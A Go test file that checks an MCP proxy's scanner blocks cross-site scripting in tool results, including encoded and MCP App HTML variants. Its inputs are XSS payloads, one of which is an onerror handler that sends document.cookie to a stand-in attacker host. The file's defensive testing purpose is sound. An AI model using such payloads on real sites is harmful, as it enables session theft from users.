package server

import "testing"

// newXSSTestProxy reuses newHeaderScanTestProxy's config (Detection master
// switch + Sanitization/XSSPrevention all enabled) — createTestMCPProxy's
// shared config leaves the Detection master switch off, which would silently
// no-op every pattern this file exercises.
func newXSSTestProxy(t *testing.T) *MCPProxy {
	return newHeaderScanTestProxy(t)
}

// toolResultText builds a minimal tools/call result carrying one plain-text
// content block, the shape extractToolResultText reads.
func toolResultText(text string) map[string]interface{} {
	return map[string]interface{}{
		"content": []interface{}{
			map[string]interface{}{"type": "text", "text": text},
		},
	}
}

// TestToolResultStripsEventHandlers verifies ISC-173: an event-handler
// attribute (onerror, onload, ...) in tool-result content is blocked.
func TestToolResultStripsEventHandlers(t *testing.T) {
	proxy := newXSSTestProxy(t)
	blocked, detail := proxy.scanToolResultForInjection(toolResultText(
		`<img src=x onerror="fetch('https://evil.example/steal?c='+document.cookie)">`))
	if !blocked {
		t.Fatalf("expected event-handler XSS to be blocked, detail=%q", detail)
	}
}

// TestToolResultStripsDataURI verifies ISC-173: a data: URI to a renderable/
// executable MIME type in tool-result content is blocked, independent of any
// literal <script> substring being present.
func TestToolResultStripsDataURI(t *testing.T) {
	proxy := newXSSTestProxy(t)
	blocked, detail := proxy.scanToolResultForInjection(toolResultText(
		`<a href="data:text/html,<b>hi</b>">click</a>`))
	if !blocked {
		t.Fatalf("expected data: URI XSS to be blocked, detail=%q", detail)
	}
}

// TestToolResultStripsSvgScript verifies ISC-173: a script tag embedded inside
// an <svg> element, without a matching close tag, is blocked (the well-formed
// <script>...</script> pattern alone would miss this).
func TestToolResultStripsSvgScript(t *testing.T) {
	proxy := newXSSTestProxy(t)
	blocked, detail := proxy.scanToolResultForInjection(toolResultText(
		`<svg><script>alert(document.domain)`))
	if !blocked {
		t.Fatalf("expected svg-embedded (unclosed) script to be blocked, detail=%q", detail)
	}
}

// TestToolResultStripsEncodedScript verifies ISC-173's "encoded variants" gap:
// a base64-encoded <script> payload, which has no literal <script> substring
// for a plain-text regex to find, is still detected after decoding.
func TestToolResultStripsEncodedScript(t *testing.T) {
	proxy := newXSSTestProxy(t)
	// base64 of "<script>alert(1)</script>"
	blocked, detail := proxy.scanToolResultForInjection(toolResultText(
		"PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="))
	if !blocked {
		t.Fatalf("expected base64-encoded script to be blocked, detail=%q", detail)
	}
}

// TestMcpAppContentScannedStrict verifies ISC-174: content destined for an MCP
// App / UI panel (identified by an "html" field rather than "text") is scanned
// for active content even though extractToolResultText would never see it.
func TestMcpAppContentScannedStrict(t *testing.T) {
	proxy := newXSSTestProxy(t)
	appResult := map[string]interface{}{
		"content": []interface{}{
			map[string]interface{}{"type": "app", "html": `<svg onload="alert(1)">`},
		},
	}

	// Plain-text extraction must not see this block at all — it's a distinct
	// content class, not a mislabeled text block.
	if texts := extractToolResultText(appResult); len(texts) != 0 {
		t.Fatalf("expected plain-text extraction to ignore an html-only block, got %v", texts)
	}

	blocked, detail := proxy.scanToolResultForInjection(appResult)
	if !blocked {
		t.Fatalf("expected MCP App content with an inline event handler to be blocked, detail=%q", detail)
	}
}
